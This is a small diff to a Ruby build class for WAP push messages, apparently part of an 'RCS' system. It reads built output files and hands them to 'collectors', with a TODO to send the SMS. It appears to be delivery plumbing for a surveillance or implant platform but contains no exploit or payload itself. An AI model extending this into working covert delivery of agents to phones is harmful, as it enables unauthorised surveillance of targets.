@@ -2,6 +2,8 @@
 # Wap PUSH messages
 #
 
+require_relative '../frontend'
+
 # from RCS::Common
 require 'rcs-common/trace'
 
@@ -68,9 +70,11 @@ class BuildWap < Build
     trace :debug, "Build: deliver: #{params}"
 
     @outputs.each do |o|
-      # TODO: put them on the collectors
-      puts o
+      content = File.open(path(o), 'rb') {|f| f.read}
+      Frontend.collector_put(o, content)
     end
+
+    # TODO: send the sms
 
   end
 
